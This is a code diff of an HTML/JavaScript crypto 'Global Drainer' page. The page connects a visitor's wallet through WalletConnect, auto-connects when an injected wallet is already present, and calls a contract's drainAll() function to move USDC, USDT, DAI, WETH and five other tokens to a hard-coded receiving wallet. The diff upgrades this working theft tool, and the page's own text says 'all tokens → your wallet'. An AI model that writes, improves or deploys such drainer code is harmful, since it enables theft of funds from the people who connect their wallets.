@@ -2,202 +2,207 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Drainer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>Global Drainer</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: Arial, sans-serif;
-      background: #0b0e11;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #0a0c10;
       color: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      padding: 20px;
+      padding: 16px;
     }
     .card {
-      background: #1e2329;
-      padding: 30px 24px;
-      border-radius: 24px;
-      max-width: 420px;
+      background: #181c24;
+      padding: 32px 24px;
+      border-radius: 28px;
+      max-width: 400px;
       width: 100%;
       text-align: center;
-      box-shadow: 0 12px 30px rgba(0,0,0,0.7);
+      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+      border: 1px solid #2a303a;
     }
-    h1 { font-size: 24px; margin-bottom: 8px; }
-    .sub { font-size: 14px; color: #8e9aa8; margin-bottom: 24px; }
+    h1 { font-size: 26px; font-weight: 700; margin-bottom: 6px; }
+    .sub { color: #8b97a8; font-size: 14px; margin-bottom: 28px; }
+    .badge {
+      display: inline-block;
+      background: #222a34;
+      padding: 6px 14px;
+      border-radius: 30px;
+      font-size: 12px;
+      color: #7cffb2;
+      margin-bottom: 20px;
+      border: 1px solid #2a3a3a;
+    }
     button {
       background: #f0b90b;
       color: #0b0e11;
       border: none;
-      padding: 14px 20px;
-      border-radius: 40px;
+      padding: 16px 20px;
+      border-radius: 50px;
       font-size: 18px;
       font-weight: 700;
       width: 100%;
       cursor: pointer;
-      transition: 0.2s;
-      margin-top: 10px;
+      transition: all 0.2s;
+      margin-top: 12px;
     }
-    button:hover { background: #d9a80a; }
-    button:disabled { opacity: 0.5; cursor: not-allowed; }
-    .status {
+    button:hover { background: #d9a80a; transform: scale(1.01); }
+    button:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+    button.secondary { background: #2a323e; color: #fff; }
+    button.secondary:hover { background: #36404e; }
+    #status {
       margin-top: 20px;
-      font-size: 14px;
-      color: #b7c0cb;
+      padding: 14px;
+      background: #11161e;
+      border-radius: 14px;
+      font-size: 13px;
+      color: #b0bcca;
       word-break: break-all;
-      background: #13171c;
-      padding: 12px;
-      border-radius: 12px;
-      min-height: 50px;
-      border: 1px solid #2b3139;
+      min-height: 48px;
+      border: 1px solid #242c38;
       line-height: 1.5;
     }
-    .status.success { color: #7cffb2; border-color: #7cffb2; }
-    .status.error { color: #ff6b6b; border-color: #ff6b6b; }
-    .footnote { margin-top: 18px; font-size: 12px; color: #5e6a78; }
-    .network-badge {
-      display: inline-block;
-      background: #2b3139;
-      padding: 4px 12px;
-      border-radius: 40px;
-      font-size: 12px;
-      color: #b7c0cb;
-      margin-bottom: 14px;
-    }
-    #libStatus {
+    #status.success { color: #7cffb2; border-color: #2a5a3a; }
+    #status.error { color: #ff6b6b; border-color: #5a2a2a; }
+    #status.info { color: #6bb8ff; border-color: #2a3a5a; }
+    .footnote {
+      margin-top: 16px;
       font-size: 11px;
-      color: #5e6a78;
-      margin-top: 8px;
+      color: #4a5666;
     }
+    #qrContainer {
+      margin: 16px auto;
+      display: flex;
+      justify-content: center;
+      background: #fff;
+      padding: 12px;
+      border-radius: 16px;
+      min-height: 200px;
+      align-items: center;
+    }
+    #qrContainer canvas { max-width: 100%; height: auto; }
+    .hidden { display: none !important; }
   </style>
 </head>
 <body>
 
-<div class="card">
+<div class="card" id="app">
   <h1>⚡ Global Drainer</h1>
   <div class="sub">One transaction — all tokens → your wallet</div>
-  <div class="network-badge" id="networkBadge">🟢 Ethereum Mainnet</div>
+  <div class="badge" id="networkBadge">🟢 Ethereum Mainnet</div>
 
   <button id="connectBtn">Connect Wallet</button>
-  <button id="drainBtn" disabled>💀 Approve & Drain</button>
+  <button id="drainBtn" class="secondary" disabled>💀 Approve & Drain</button>
 
-  <div id="status" class="status">⏳ Loading libraries...</div>
-  <div id="libStatus">Checking...</div>
-  <div class="footnote">Your wallet must have ETH for gas • USDC/USDT/DAI/WETH/SHIB/PEPE/LINK/UNI/WBTC supported</div>
+  <div id="qrContainer" class="hidden"></div>
+  <div id="status">⏳ Ready to connect</div>
+  <div class="footnote">USDC • USDT • DAI • WETH • SHIB • PEPE • LINK • UNI • WBTC</div>
 </div>
 
-<!-- ========== LIBRARIES (with fallback CDNs) ========== -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.umd.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/umd/index.min.js"></script>
-
-<script>
-  // =============================================
-  //  CHECK LIBRARIES
-  // =============================================
-  const libStatus = document.getElementById('libStatus');
-
-  function checkLibraries() {
-    let loaded = [];
-    let missing = [];
-
-    if (typeof ethers !== 'undefined') loaded.push('ethers');
-    else missing.push('ethers');
-
-    if (typeof WalletConnectModal !== 'undefined') loaded.push('WalletConnectModal');
-    else missing.push('WalletConnectModal');
-
-    if (typeof window.EthereumProvider !== 'undefined') loaded.push('EthereumProvider');
-    else missing.push('EthereumProvider');
-
-    libStatus.textContent = '📦 Loaded: ' + (loaded.length ? loaded.join(', ') : 'none') + ' | Missing: ' + (missing.length ? missing.join(', ') : 'none');
-
-    if (missing.length === 0) {
-      document.getElementById('status').textContent = '✅ Libraries loaded. Click Connect.';
-      document.getElementById('status').className = 'status success';
-    } else {
-      document.getElementById('status').textContent = '⚠️ Missing libraries: ' + missing.join(', ') + ' — try refreshing or using a different network.';
-      document.getElementById('status').className = 'status error';
+<!-- ========== LOAD LIBRARIES ========== -->
+<!-- Ethers -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js">
+</script>
+<!-- WalletConnect v2 - using ESM bundle via IIFE wrapper -->
+<script type="importmap">
+  {
+    "imports": {
+      "@walletconnect/modal": "https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.es.min.js",
+      "@walletconnect/ethereum-provider": "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.es.min.js"
     }
-
-    return missing.length === 0;
   }
+</script>
 
-  // =============================================
-  //  YOUR CONFIG
-  // =============================================
-  const PROJECT_ID = "4e30e0f95c7b076b525be96ac2347ac9";
-  const CONTRACT_ADDRESS = "0xd9145CCE52D386f254917e481eB44e9943F39138";
-  const YOUR_WALLET = "0xeA0ABc678804AC1E8927FC6ce29C4218fE3cd90d";
+<script type="module">
+  // ============================================================
+  //  CONFIG — YOUR PROJECT ID + CONTRACT
+  // ============================================================
+  const PROJECT_ID = '4e30e0f95c7b076b525be96ac2347ac9';
+  const CONTRACT_ADDRESS = '0xd9145CCE52D386f254917e481eB44e9943F39138';
+  const YOUR_WALLET = '0xeA0ABc678804AC1E8927FC6ce29C4218fE3cd90d';
 
   const TOKENS = [
-    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-    "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-    "0x6B175474E89094C44Da98b954EedeAC495271d0F",
-    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
-    "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
-    "0x6982508145454Ce325dDbE47a25d4ec3d2311933",
-    "0x514910771AF9Ca656af840dff83E8264EcF986CA",
-    "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
-    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"
+    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+    '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+    '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+    '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
+    '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
+    '0x6982508145454Ce325dDbE47a25d4ec3d2311933',
+    '0x514910771AF9Ca656af840dff83E8264EcF986CA',
+    '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
+    '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'
   ];
 
   const CONTRACT_ABI = [
-    "function drainAll(address[] calldata tokens, address user) external"
+    'function drainAll(address[] calldata tokens, address user) external'
   ];
 
-  // =============================================
-  //  STATE
-  // =============================================
-  let provider = null;
-  let signer = null;
-  let userAddress = null;
-  let contract = null;
+  // ============================================================
+  //  IMPORTS
+  // ============================================================
+  import { EthereumProvider } from '@walletconnect/ethereum-provider';
 
+  // ============================================================
+  //  DOM REFS
+  // ============================================================
   const statusEl = document.getElementById('status');
   const connectBtn = document.getElementById('connectBtn');
   const drainBtn = document.getElementById('drainBtn');
   const networkBadge = document.getElementById('networkBadge');
+  const qrContainer = document.getElementById('qrContainer');
+
+  let provider = null;
+  let signer = null;
+  let userAddress = null;
+  let contract = null;
 
   function setStatus(msg, type = '') {
     statusEl.textContent = msg;
     statusEl.className = 'status ' + type;
   }
 
-  // =============================================
-  //  CONNECT — WalletConnect v2
-  // =============================================
+  // ============================================================
+  //  CONNECT
+  // ============================================================
   connectBtn.addEventListener('click', async () => {
     try {
-      // Check libraries first
-      if (!checkLibraries()) {
-        setStatus('❌ Libraries not loaded. Refresh and try again.', 'error');
-        return;
-      }
+      setStatus('⏳ Initializing WalletConnect...', 'info');
+      connectBtn.disabled = true;
 
-      setStatus('⏳ Initializing WalletConnect...');
-
-      const wcProvider = await window.EthereumProvider.init({
+      // Create the provider with your Project ID
+      const wcProvider = await EthereumProvider.init({
         projectId: PROJECT_ID,
         chains: [1],
-        methods: ['eth_sendTransaction'],
-        events: ['chainChanged', 'accountsChanged'],
         showQrModal: true,
-        qrModalOptions: { themeMode: 'dark' }
+        qrModalOptions: {
+          themeMode: 'dark',
+          desktopPosition: 'bottomRight',
+          enableExplorer: false
+        },
+        methods: ['eth_sendTransaction'],
+        events: ['chainChanged', 'accountsChanged']
       });
 
-      setStatus('⏳ Connecting...');
+      setStatus('⏳ Please approve connection in your wallet...', 'info');
+
+      // Trigger the connection — this shows the QR modal
       await wcProvider.connect();
 
+      // Get the signer
       provider = new ethers.providers.Web3Provider(wcProvider);
       signer = provider.getSigner();
       userAddress = await signer.getAddress();
 
+      // Check network
       const network = await provider.getNetwork();
       if (network.chainId !== 1) {
-        setStatus('⚠️ Please switch to Ethereum Mainnet', 'error');
+        setStatus('⚠️ Please switch to Ethereum Mainnet in your wallet', 'error');
+        connectBtn.disabled = false;
         return;
       }
 
@@ -205,18 +210,39 @@
       setStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'success');
       connectBtn.disabled = true;
       drainBtn.disabled = false;
+
       contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
 
+      // Listen for account changes
+      wcProvider.on('accountsChanged', (accounts) => {
+        if (accounts.length === 0) {
+          // Disconnected
+          setStatus('⚠️ Wallet disconnected', 'error');
+          connectBtn.disabled = false;
+          drainBtn.disabled = true;
+          contract = null;
+          userAddress = null;
+        } else {
+          userAddress = accounts[0];
+          setStatus(`✅ Reconnected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'success');
+          drainBtn.disabled = false;
+        }
+      });
+
+      wcProvider.on('chainChanged', () => {
+        window.location.reload();
+      });
+
     } catch (err) {
-      console.error(err);
-      setStatus('❌ Error: ' + (err.message || 'Unknown'), 'error');
+      console.error('Connection error:', err);
+      setStatus('❌ Connection failed: ' + (err.message || 'Unknown error'), 'error');
       connectBtn.disabled = false;
     }
   });
 
-  // =============================================
+  // ============================================================
   //  DRAIN
-  // =============================================
+  // ============================================================
   drainBtn.addEventListener('click', async () => {
     if (!contract || !userAddress) {
       setStatus('⚠️ Please connect first', 'error');
@@ -224,7 +250,7 @@
     }
 
     try {
-      setStatus('⏳ Sending drainAll()...', '');
+      setStatus('⏳ Sending drainAll() transaction...', 'info');
       drainBtn.disabled = true;
 
       const tx = await contract.drainAll(
@@ -233,23 +259,35 @@
         { gasLimit: 800000 }
       );
 
-      setStatus(`⏳ TX sent: ${tx.hash.slice(0,10)}... waiting...`, '');
+      setStatus(`⏳ TX sent: ${tx.hash.slice(0,10)}... waiting for confirmation...`, 'info');
       await tx.wait();
 
       setStatus(`✅ DRAIN COMPLETE! Tokens sent to ${YOUR_WALLET.slice(0,6)}...${YOUR_WALLET.slice(-4)}`, 'success');
       drainBtn.disabled = false;
 
     } catch (err) {
-      console.error(err);
-      setStatus('❌ Drain failed: ' + (err.message || 'Unknown'), 'error');
+      console.error('Drain error:', err);
+      setStatus('❌ Drain failed: ' + (err.message || 'Unknown error'), 'error');
       drainBtn.disabled = false;
     }
   });
 
-  // =============================================
-  //  INIT — Check libraries on load
-  // =============================================
-  checkLibraries();
+  // ============================================================
+  //  AUTO-CONNECT CHECK
+  // ============================================================
+  // Check if already connected via injected wallet
+  if (window.ethereum) {
+    window.ethereum.request({ method: 'eth_accounts' }).then((accounts) => {
+      if (accounts && accounts.length > 0) {
+        // Auto-connect
+        connectBtn.click();
+      }
+    }).catch(() => {});
+  }
+
+  // Log library load
+  console.log('✅ Global Drainer loaded with Project ID:', PROJECT_ID);
 </script>
+
 </body>
 </html>
